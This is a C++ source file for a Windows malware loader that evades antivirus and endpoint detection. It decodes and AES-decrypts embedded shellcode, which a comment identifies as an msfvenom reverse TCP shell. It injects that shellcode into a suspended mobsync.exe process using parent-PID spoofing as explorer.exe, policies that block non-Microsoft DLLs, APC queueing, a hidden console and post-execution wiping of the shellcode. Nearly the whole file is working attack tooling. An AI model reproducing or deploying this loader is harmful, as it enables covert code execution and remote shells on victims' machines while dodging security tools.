#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"

// This is just directly stolen from ired.team
DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

// Process Hollowing
VOID hollow(std::vector<byte> payload)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Mask the PPID to that of explorer.exe
    HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);

    LPCWSTR hollow_bin = TEXT("C:\\Windows\\System32\\mobsync.exe");
    if (!CreateProcess(
        hollow_bin,			// LPCWSTR Command (Binary to Execute)
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        FALSE,				// Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	// Creation Flags
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "[!] ERROR" << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1500);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T p_size = payload.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PULONG)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    // Overwrite shellcode with null bytes
    Sleep(10000);
    uint8_t overwrite[500];
    NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);

}


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    // Decode shellcode and load into uint8_t vector for decryption
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
    shellcode = "+R1SJjLLLLZxU7aVqyWuQTHkgmq8rINN1WT7jQTgRFDmWGCNTMf2cn+Vy9hV9y1BSQa+1xLNOBmkodx9Scx5wD+ljpuciiJ7aygUK3waZLblMTC5dUgZsUocxYo8sg4B76KumKv2D+iGbPHboRIF4zs56kc2ya4ZgIfh/PJuSv4zIJ4qrClS1uGUt1h4L7j6G46TbEuciRO6mUEonYgbM0jYhsCNdStZYOfw5WCBWr6g/ipPlPibWA40fVLP/RKRKX5QKf8553CJuRbWF+m0RYeuhF+YkMTscmJUuoLC+S7Iow1B7Ui/Ehs82uN5+ie2Mjd3WDCF09hLvUfwTj73zh4FTCNQVtv1YTHYyjcVI3eOzWMrKAH+QTFtE9Nbp/5LFqRwKTvLpIBIQIq7s+qMyvBOFHUNEeMDhKvfRTLriS/vTXAbXNItnqd5vYutk3xlDTr3ULQir8r/G2GLPY/wTLZLM9l/KXdLBAMEVW3AXNUNwwW/T1lHt4OdwtyhrAgfBOVl4QBj03cQV3WzHYliwko9ustTQxcKz2gA/GwwAUSCrEv5OQcNYNLo6r20JZbaLAaEWfpVSpDGzjBZ6bsIXZjZslUgWQA0VYAxHUFgc6U8SYYIs5zU3+LfRjgxpjSRvn41POSkbw6f4xazUNge/yVWGI8fBbovyKv9tK0cbRCDpAbHkh4O1JqlU/P9Jxd4wDYeHPEZFjSfEoTUbWlCMqF3ADVWB5QDrlNIZoQF/4zqQJ6hyILe0oMfEXNgTTW/W5BAC03q8012/+BmakajaWEtDxo6QukaMIntXpPjFWzg19mUxfQFyUnsr91igW/vl2brVOAYlbBJ9E7JN6A6q8rwF4x22L+q3Dl2UCL8f0dDaXwyXu3Omu3Q05Cn/KocoA+Dl6aZ0xTl7zpZ/qBSTveR60WR451JqyOsCsI2ArKIJZk82puv9d8ilHshUAu6SUoSyLMb8R5ZPmJya9942cbLT4LKIaL43rndZWu086Ux/jt8Z0C3vwt/bBu8uP6ML4bAOpQCI77RkGZhGa/3owBpr7GuuD/HgwrH9yhQ5xS+wasEHTOKrqLoAImA/s9R5+9GOmeUkUjOCFcdr8+upKmJQFNJf2DlsMKLeAv4b1A+CcyelTIzbicJQUnQdVR35WFt3DhvWqvQa+gMkt2eLoctaLF31eZouQqh6ZPBkkU/eoJ6/0nXHz9KI1YjfN8anXjythb2SXNvbRDG7eCjCw==";
    decoded = b64.base64_decode(shellcode);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t key[32] = {0x5f,0x72,0x19,0x5f,0xb1,0xe7,0xc5,0xc1,0x8f,0x45,0xaa,0x53,0x0f,0x4b,0x55,0xeb,0xb1,0xd3,0x31,0x08,0x60,0x87,0x35,0x73,0xe1,0x40,0x2e,0x9a,0xd9,0xe8,0x06,0xb7};
    uint8_t iv[16] = {0x16,0xd3,0xc3,0x4b,0x11,0xe5,0x46,0x99,0x58,0xef,0xec,0xd8,0xf5,0xa6,0x0d,0xbc};
    
    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    // Remove the padding from the decypted plaintext
    SIZE_T c_size = ciphertext.size();
    for (int i = 0; i < c_size; i++)
    {
        if (ciphertext[i] == 0x90 && i == (c_size - 1))
        {
            break;
        }
        else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            recovered.push_back(ciphertext[i]);
        }
    }

    hollow(recovered);
    return 0;
}

